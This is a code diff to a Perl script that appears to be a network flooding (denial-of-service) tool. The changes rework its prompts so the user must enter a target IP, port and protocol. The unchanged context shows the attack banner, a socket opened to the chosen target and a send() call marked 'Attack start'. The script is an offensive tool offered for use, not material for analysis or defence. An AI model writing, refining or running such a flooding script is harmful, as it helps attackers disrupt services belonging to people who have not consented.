@@ -22,17 +22,40 @@ print q{
 };
 # INPUT TARGET INFO ==============================================
 print "\n===============================";
-print "\n Enter TargetIP: "; # Set Target IP
-chop ($host = <stdin>);
-print "===============================";
-print "\n Enter Port: "; # Set Port
-chop ($port = <stdin>);
-print "===============================";
-print "\n Enter Protockol (TCP or UDP) :"; # Set Protockol
-chop ($proto = <stdin>);
+print "\n[~] Enter TargetIP: "; # Set Target IP
+$host = <STDIN>;
+chomp ($host);
+while ($host eq ""){
+ print "   [!] Enter TargetIP?: ";
+ $host = <STDIN>;
+ chomp ($host);
+}
+print "TRAGET ==> $host";
+print "\n===============================";
+print "\n[~] Enter Port: "; # Set Port
+$port = <STDIN>;
+chomp ($port);
+while ($port eq ""){ 
+ print "   [!] Enter PORT?: ";       
+ $port = <STDIN>;
+ chomp ($port); 
+}
+print "PORT ==> $port";
+print "\n===============================";
+print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
+$proto = <STDIN>;
+chomp ($proto);
+while ($proto eq ""){
+ print "   [!] Enter Protockol (TCP or UDP) ?: ";
+ $proto = <STDIN>;
+ chomp ($proto);
+}
+print "Protocol ==> $proto";
+print "\n===============================";
+sleep(2);
 system("clear || cls");
 print "\n[*]Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
-sleep 3;
+sleep(3);
 
 {
 $sock = IO::Socket::INET->new (
@@ -67,5 +90,6 @@ send($sock, $size, $size); # Attack start################
 #This Script by Oseid Aldary
 #Have a nice day :)
 #GoodBye
+
 
 
